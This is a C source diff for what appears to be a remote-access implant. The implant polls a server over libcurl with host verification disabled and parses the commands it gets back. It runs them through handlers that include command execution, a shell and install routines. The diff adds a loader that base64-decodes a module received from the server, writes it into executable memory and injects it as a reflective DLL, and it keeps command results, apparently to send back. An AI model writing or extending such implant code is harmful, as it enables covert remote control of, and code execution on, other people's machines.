@@ -9,6 +9,7 @@
 #include "common.h"
 #include "messagebox.h"
 #include "screenshot.h"
+#include "base64.h"
 
 #define CURL_STATICLIB
 #include "tinycurl\include\curl\curl.h"
@@ -35,7 +36,7 @@ __declspec(dllexport) void MainExport(void);
 
 // This is for libcurl response data
 struct MemoryStruct {
-    char *response;
+    char *memory;
     size_t size;
 };
 
@@ -45,9 +46,9 @@ char* STORED_RESPONSE = NULL;
 // Built-in Commands
 char* CMD_exec(char* args)
 {
-    STORED_RESPONSE = execute_command(args);
-    printf("Command: %s\nResult: %s\n", args, STORED_RESPONSE);
-    return NULL;
+    char* tmp = execute_command(args);
+    printf("Command: %s\nResult: %s\n", args, tmp);
+    return tmp;
 }
 
 char* CMD_shell(char* args)
@@ -59,6 +60,36 @@ char* CMD_shell(char* args)
 char* CMD_load(char* args)
 {
     printf("Received load command with arguments: %s\n", args);
+    size_t module_len = 0;
+    unsigned char* module = base64_decode(args, strlen(args), &module_len);
+    LPVOID lpBuffer = NULL;
+    HANDLE hModule  = NULL;
+
+    printf("Module: %p", module);
+    printf("Module length: %zu\n", module_len);
+    // lpBuffer = VirtualAlloc(NULL, messageboxdll_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    lpBuffer = VirtualAlloc(NULL, module_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if( !lpBuffer )
+		BREAK_WITH_ERROR( "Failed to allocate space" );
+
+    // memcpy(lpBuffer, messageboxdll_dll, messageboxdll_dll_len);
+    memcpy(lpBuffer, module, module_len);
+    printf("memcpy\n");
+    fflush(stdout);
+
+    CommandNodePointer func;
+    hModule = (HANDLE)ReflectiveLoader( lpBuffer, &func );
+	if( !hModule )
+		BREAK_WITH_ERROR( "Failed to inject the DLL" );
+    
+    CommandNode* tester = func();
+    printf("Tester: %s\n", tester->command);
+    printf("Done with reflective test.\n");
+
+    insertCommandNode(&commandList, createCommandNode(tester->command, tester->function));
+
+    printf("Inserted command!\n");
+
     return NULL;
 }
 
@@ -78,14 +109,39 @@ char* CMD_install(char* args)
     return NULL;
 }
 
-// Callback function to handle incoming data
-size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *clientp)
-{
-    // Null-terminate the response just in case
-    char* data = ptr;
-    data[(size*nmemb)-1] = '\0';
-    printf("Received data: %s\n", (char *)ptr);
+// // Callback function to handle incoming data
+// size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *clientp)
+// {
+//     // Null-terminate the response just in case
+//     char* data = ptr;
+//     data[(size*nmemb)-1] = '\0';
+//     printf("Received data: %s\n", (char *)ptr);
     
+//     // Find the first space character to separate command and arguments
+//     char *space_pos = strchr(data, ' ');
+
+//     // Replace space with null byte to separate command and arguments
+//     if (space_pos != NULL)
+//     {
+//         *space_pos = '\0';
+//     }
+//     // Calculate pointers for command and arguments
+//     char *command = data;
+//     char *arguments = space_pos + 1;
+
+//     CommandNode* commandnode = findCommandNode(commandList, command);
+
+//     if (commandnode != NULL)
+//     {
+//         STORED_RESPONSE = commandnode->function(arguments);
+//     }
+
+//     return size * nmemb;
+// }
+
+// Callback function to handle incoming data
+void check_response(char* data)
+{   
     // Find the first space character to separate command and arguments
     char *space_pos = strchr(data, ' ');
 
@@ -102,14 +158,9 @@ size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *clientp)
 
     if (commandnode != NULL)
     {
-        commandnode->function(arguments);
+        STORED_RESPONSE = commandnode->function(arguments);
     }
-
-    return size * nmemb;
 }
-
-// TEST CODE
-typedef void (*ShowMessageBoxFunc)(char*);
 
 void ReflectiveTest(void)
 {
@@ -136,11 +187,10 @@ void ReflectiveTest(void)
     STORED_RESPONSE = tester->function("some args");
     printf("Done with reflective test.\n");
 }
-// END TEST CODE
 
 int main(void)
 {
-    ReflectiveTest(); // TEST CODE
+    ReflectiveTest();
     // Initialize curl
     curl_global_init(CURL_GLOBAL_DEFAULT);
 
@@ -171,10 +221,38 @@ void jitter_connect()
     }
 }
 
+// Callback function to write received data to a dynamically growing buffer
+size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    size_t realsize = size * nmemb;
+    struct MemoryStruct *mem = (struct MemoryStruct *)userdata;
+    
+    // Reallocate memory to fit the new data
+    char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
+    if (ptr_realloc == NULL) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return 0;
+    }
+    
+    mem->memory = ptr_realloc;
+    memcpy(&(mem->memory[mem->size]), ptr, realsize);
+    mem->size += realsize;
+    mem->memory[mem->size] = '\0';
+    
+    return realsize;
+}
+
 void command_loop(void)
 {
     CURL *curl;
     CURLcode res;
+    struct MemoryStruct chunk;
+    // Initialize memory structure
+    chunk.memory = malloc(1);  // Start with a small initial size
+    if (chunk.memory == NULL) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return;
+    }
+    chunk.size = 0;  // No data yet
     
     char* tmp = NULL;
 
@@ -201,7 +279,9 @@ void command_loop(void)
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 
         // Specify the callback function to handle the response data
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+        // curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
 
         // Perform the request
         res = curl_easy_perform(curl);
@@ -215,6 +295,7 @@ void command_loop(void)
             long response_code;
             curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
             printf("Response code: %ld\n", response_code);
+            check_response(chunk.memory);
         }
 
         // Cleanup
